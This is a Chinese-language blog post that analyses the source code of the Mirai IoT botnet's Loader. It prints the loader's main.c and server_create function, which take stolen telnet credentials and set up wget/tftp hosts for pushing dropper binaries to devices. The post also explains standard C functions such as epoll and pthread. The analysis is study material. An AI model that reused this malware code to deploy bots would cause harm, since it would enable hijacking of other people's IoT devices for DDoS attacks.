---
title: Mirai源代码分析1--Loader的工作过程
date: 2018-10-29 06:09:31
updated: 2018-10-29 06:09:31
categories: Network
tags: Mirai
top:
---
![](/images/in-post/2018-10-29-Mirai-loader-Code-Walking-thought/2018-10-30-12-42-01.png)

# 前言

> The Mirai internet of things (IoT) botnet is infamous for targeting connected household consumer products. It attaches itself to cameras, alarm systems and personal routers, and spreads quickly. The damage can be quite substantial. People might not realize that their internet-enabled webcam was actually responsible for attacking Netflix. Cite:[How to Identify a Mirai-Style DDoS Attack](https://www.incapsula.com/blog/how-to-identify-a-mirai-style-ddos-attack.html)

Mirai IoT 僵尸网络可以连接到家居的用户级的IoT设备，它可以将自己安装到摄像头，警报器以及个人的路由器里面，并且能够非常快的扩散出去，造成很大的破坏力。

<!-- more -->

------------

# 主要工作流程

![](/images/in-post/2018-10-29-Mirai-loader-Code-Walking-thought/2018-10-30-10-09-07.png)

- Preparing the Attack
- Deploying the Malware
- Repeating the Attack

在这一篇博客里，主要对`Deploying the Malware`的流程的源代码进行详细的分析，希望能够在源代码阅读中，更加清晰地了解`Mirai`的入侵流程。

------------

# 部署Malware的流程

在这部分主要分析，Mirai Malware 是怎么部署到IoT设备上面的，也就是整个入侵的过程，这个过程是基于其他的`Bot`已经发现了登录到这个系统的帐号之后。入侵过程分为下面三个部分：

- Scan success identified
- Loader receives data
- Loader pushes malware

![](/images/in-post/2018-10-29-Mirai-loader-Code-Walking-thought/2018-10-30-10-43-52.png)

Malware 的源代码在 `Master`端通过交叉编译的方式使其能够支持一系列的体系架构，在Mater端的`Loader`代码试图确定即将感染的`Bot`的硬件体系架构，然后再`Push`最合适的可执行程序过去。然后，在可执行文件运行的情况下，该设备现在是僵尸网络的成员，并开始执行与僵尸网络中任何其他节点相同的扫描和攻击活动。

**文件目录介绍**：

![](/images/in-post/2018-10-29-Mirai-loader-Code-Walking-thought/2018-10-30-10-51-24.png)

左上方显示的目录是`Loader`根目录，里面包含了两个文件夹：`bin`和`src`，两个文件夹分别包含了：

- `bin`文件夹： 包含了`dlr.arm， dlr.arm7， dlr.m68k， dlr.mips， dlr.mpsl, dlr.ppc,dlr.sh4, dlr.spc, dlr.x86`不同体系架构上面的可执行代码.
- `src`文件夹：
    - main.c Loader执行过程的核心程序
    - connection.c 
    - server.c
    - telnet_info.c
    - util.c 工具文件, 提供给其他部分可以调用的四个函数工具
    - server.c

## 源代码分析

首先对`main`函数进行分析，因为整个文件不算太长，所以就将其源代码全部放在这里进行分析。

```cpp
#include <errno.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include "headers/binary.h"
#include "headers/includes.h"
#include "headers/server.h"
#include "headers/telnet_info.h"
#include "headers/util.h"

static void *stats_thread(void *);
static struct server *srv; //重要全局变量
char *id_tag = "telnet";

int main(int argc, char **args) {
  pthread_t stats_thrd;
  uint8_t addrs_len;
  ipv4_t *addrs;
  uint32_t total = 0;
  struct telnet_info info;

  addrs_len = 2;
  addrs = calloc(addrs_len, sizeof(ipv4_t));
  addrs[0] = inet_addr("192.168.0.1");  // Address to bind to
  addrs[1] = inet_addr("192.168.1.1");  // Address to bind to

  if (argc == 2) {
    id_tag = args[1];
  }

  if (!binary_init()) {
    printf("Failed to load bins/dlr.* as dropper\n");
    return 1;
  }

  if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs,
                           1024 * 64, "100.200.100.100", 80,
                           "100.200.100.100")) == NULL) {
    printf("Failed to initialize server. Aborting\n");
    return 1;
  }

  pthread_create(&stats_thrd, NULL, stats_thread, NULL);

  while (TRUE) {
    char strbuf[1024];
    if (fgets(strbuf, sizeof(strbuf), stdin) == NULL) break;

    util_trim(strbuf);

    if (strlen(strbuf) == 0) {
      usleep(10000);
      continue;
    }

    memset(&info, 0, sizeof(struct telnet_info));
    if (telnet_info_parse(strbuf, &info) == NULL)
      printf(
          "Failed to parse telnet info: \"%s\" Format -> ip:port user:pass "
          "arch\n",
          strbuf);
    else {
      if (srv == NULL) printf("srv == NULL 2\n");

      server_queue_telnet(srv, &info);
      if (total++ % 1000 == 0) sleep(1);
    }

    ATOMIC_INC(&srv->total_input);
  }

  printf("Hit end of input.\n");

  while (ATOMIC_GET(&srv->curr_open) > 0) sleep(1);

  return 0;
}

static void *stats_thread(void *arg) {
  uint32_t seconds = 0;

  while (TRUE) {
    fflush(stdout);
    sleep(1);
  }
}

```

Main.c文件中有这样几个重要的结构体：

- static struct server *srv; 全局变量
- struct telnet_info info; 局部变量

几个重要的函数

- binary_init() 函数
- srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, "100.200.100.100", 80,"100.200.100.100")) == NULL) 里面的`server_create`函数。
- 最后循环里面的：telnet_info_parse(strbuf, &info) 与 server_queue_telnet(srv, &info)函数

### server_create 函数调用（Server.c）

在`main.c`里面的main函数中调用了`server_create`函数来创建了服务器用来支持`sftp`和`wget`协议。

**main.c**

```cpp
if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs,
                        1024 * 64, "100.200.100.100", 80,
                        "100.200.100.100")) == NULL) {
printf("Failed to initialize server. Aborting\n");
return 1;
}
```

server.c

```cpp
struct server *server_create(uint8_t threads, uint8_t addr_len, ipv4_t *addrs,
                             uint32_t max_open, char *wghip, port_t wghp,
                             char *thip) {
  struct server *srv = calloc(1, sizeof(struct server));
  struct server_worker *workers = calloc(threads, sizeof(struct server_worker));
  int i;
  srv->bind_addrs_len = addr_len;  // Default = 2
  srv->bind_addrs = addrs;
  srv->max_open = max_open;    // 1024 * 64
  srv->wget_host_ip = wghip;   // 100.200.100.100
  srv->wget_host_port = wghp;  // 80
  srv->tftp_host_ip = thip;    // 100.200.100.100
  srv->estab_conns = calloc(max_open * 2, sizeof(struct connection *));

  srv->workers = calloc(threads, sizeof(struct server_worker));
  srv->workers_len = threads;

  if (srv->estab_conns == NULL) {
    printf("Failed to allocate establisted_connections array.\n");
    exit(0);
  }

  for (i = 0; i < max_open * 2; i++) {
    srv->estab_conns[i] = calloc(1, sizeof(struct connection));
    if (srv->estab_conns[i] == NULL) {
      printf("Failed to allocate connection %d\n", i);
      exit(-1);
    }

    pthread_mutex_init(&(srv->estab_conns[i]->lock), NULL);
  }

  // Create worker threads
  for (i = 0; i < threads; i++)  //有多少个处理器
  {
    struct server_worker *wrker =
        &srv->workers[i];  //定义的指针只想src->worker的地址

    wrker->srv = srv;  //相互指定
    wrker->thread_id = i;

    if ((wrker->efd = epoll_create1(0)) == -1) {
      printf("Failed to initialize epoll context. Error code %d\n", errno);
      free(srv->workers);
      free(srv);
      return NULL;
    }

    pthread_create(&wrker->thread, NULL, worker, wrker);
  }

  pthread_create(&srv->to_thrd, NULL, timeout_thread, srv);

  return srv;
}
```

这个函数完成了服务器的配置，确定了服务器方的`tftp`和`wget`的服务提供方式，以及`Port`的编号。

-------------

## 代码中的几个函数说明

#### sysconf函数

[sysconf函数](http://man7.org/linux/man-pages/man3/sysconf.3.html)： Get configuration information at run time

```cpp
#include <unistd.h>
long sysconf(int name);
```

#### pthread_mutex_init函数

pthread_mutex_init(&(srv->estab_conns[i]->lock), NULL);

> - pthread_mutex_init(pthread_mutex_t * mutex,const pthread_mutexattr_t *attr); 初始化锁变量mutex。attr为锁属性，NULL值为默认属性。
> - pthread_mutex_lock(pthread_mutex_t *mutex);加锁
> - pthread_mutex_tylock(pthread_mutex_t *mutex);加锁，但是与2不一样的是当锁已经在使用的时候，返回为EBUSY，而不是挂起等待。
> - pthread_mutex_unlock(pthread_mutex_t *mutex);释放锁
> - pthread_mutex_destroy(pthread_mutex_t *mutex);使用完后释放

#### epoll函数

epoll 与 FreeBSD的kqueue类似，都向用户空间提供了自己的文件描述符来进行操作。

`int epoll_create(int size);`

建一个epoll的句柄，size用来告诉内核需要监听的数目一共有多大。当创建好epoll句柄后，它就是会占用一个fd值，在linux下如果查看/proc/进程id/fd/，是能够看到这个fd的，所以在使用完epoll后，必须调用close() 关闭，否则可能导致fd被耗尽。

`int epoll_create1(int flag);`

它和epoll_create差不多，不同的是epoll_create1函数的参数是flag，当flag是0时，表示和epoll_create函数完全一样，不需要size的提示了。

当flag = EPOLL_CLOEXEC，创建的epfd会设置FD_CLOEXEC。 

当flag = EPOLL_NONBLOCK，创建的epfd会设置为非阻塞

一般用法都是使用EPOLL_CLOEXEC.

它是fd的一个标识说明，用来设置文件close-on-exec状态的。当close-on-exec状态为0时，调用exec时，fd不会被关闭；状态非零时则会被关闭，这样做可以防止fd泄露给执行exec后的进程。关于exec的用法，大家可以去自己查阅下，或者直接man exec。

#### pthread_create函数

```cpp
#include <pthread.h>

int pthread_create(pthread_t *thread, const pthread_attr_t *attr,
                  void *(*start_routine) (void *), void *arg);

Compile and link with -pthread.
```

 The pthread_create() function starts a new thread in the calling
       process.  The new thread starts execution by invoking
       start_routine(); arg is passed as the sole argument of
       start_routine().
　若成功则返回0，否则返回出错编号

参数

　　第一个参数为指向线程标识符的指针。

　　第二个参数用来设置线程属性。

　　第三个参数是线程运行函数的起始地址。

最后一个参数是运行函数的参数。

#### 去掉字符串前后的空格

```cpp
// 用来处理前后空格的问题
char *util_trim(char *str)
{
    char *end;

    while(isspace(*str)) //处理前面的空格
        str++;

    if(*str == 0) //指向了 0 , 就是输入的地一个字符是 0 的话，那么就直接返回去这个 str
        return str;

    //strlen()用来计算指定的字符串s 的长度，不包括结束字符"\0"。
    end = str + strlen(str) - 1; //判断结束位置---移动到最后一个 /0 之前
    while(end > str && isspace(*end)) //如果end位置大约str的擦汗你高度，并且end位置为空的话，那就移动回来
        end--;

    *(end+1) = 0; //给出结束位置

    return str;
}

char strbuf[1024];
util_trim(strbuf);
```

# memset函数

`函数原型是：void *memset(void *s, int ch, size_t n);`

 函数功能是：将s所指向的某一块内存中的前n个字节的内容全部设置为ch指定的ASCII值， 第一个值为指定的内存地址，块的大小由第三个参数指定，这个函数通常为新申请的内存做初始化工作， 其返回值为指向s的指针，它是对较大的结构体或数组进行清零操作的一种最快方法。

 memset函数通常用来对一块已经分配地址的内存进行初始化，并且通常初始化为0或者字符'\0'（实际上是一样的）。


# strtok 函数

函数原型：char *strtok(char *s, char *delim); 
函数功能：把字符串s按照字符串delim进行分割，然后返回分割的结果。 

1.strtok函数的实质上的处理是，strtok在s中查找包含在delim中的字符并用NULL(’\0′)来替换,直到找遍整个字符串。这句话有两层含义：（1）每次调用strtok函数只能获得一个分割单位。（2）要获得所有的分割单元必须反复调用strtok函数。 

2.strtok函数以后的调用时的需用NULL来替换s. 

3.形参s(要分割的字符串)对应的变量应用char s[]=”….”形式，而不能用char *s=”….”形式 





